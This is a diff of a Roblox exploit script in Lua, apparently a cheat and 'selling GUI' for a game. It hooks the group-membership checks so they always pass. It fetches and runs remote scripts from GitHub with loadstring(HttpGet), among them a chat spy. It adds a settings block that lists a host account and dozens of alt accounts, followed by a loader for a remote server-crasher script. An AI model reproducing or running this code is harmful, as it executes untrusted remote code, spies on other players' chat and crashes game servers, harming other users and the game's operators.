@@ -39,11 +39,48 @@ end
 hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
 hookfunction(game.Players.LocalPlayer.GetRankInGroup, function() return true end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/chatspy.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/crasher.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/Counter/main/Cash"))()
 game.CoreGui.Crostide_Recode.Frame.Frame.TextLabel.Text = "    JMAN's Selling GUI"
 game.CoreGui.Crostide_Recode.Frame.CreditsFrame.TextLabel.Text = "eyedress#0995"
+
+getgenv().Crasher_Settings = {
+    ["Host"] = "MollyKnox17",
+    ["AltFPS"] = "3",
+    ["Strength"] = "100",
+    ["Alts"]  = { 
+        "JMANDHC1",
+        "JMANDHC2", 
+        "JMANDHC3",
+        "JMANDHC4",
+        "JMANDHC5",
+        "JMANDHC6",
+        "JMANDHC7",
+        "JMANDHC8",
+        "JMANDHC9",
+        "JMANDHC",
+        "JMANDHC11",
+        "Dropperniredja1",
+        "Dropperniredja2",
+        "Dropperniredja3",
+        "Dropperniredja4",
+        "Dropperniredja5",
+        "Lueilwitz58936",
+        "Sipes79236",
+        "Frami58765",
+        "Reinger83675",
+        "Leannon59048",
+        "DavidTapia4",
+        "AmySaunders8",
+        "KatherinePowers7",
+        "MaryKidd21",
+        "SusanBurton50",
+        "TamiHernandez6",
+        "TracyTodd5"
+    }
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/crash/main/main"))()
 
 local plr = game.Players.LocalPlayer
 local ScreenHide = false
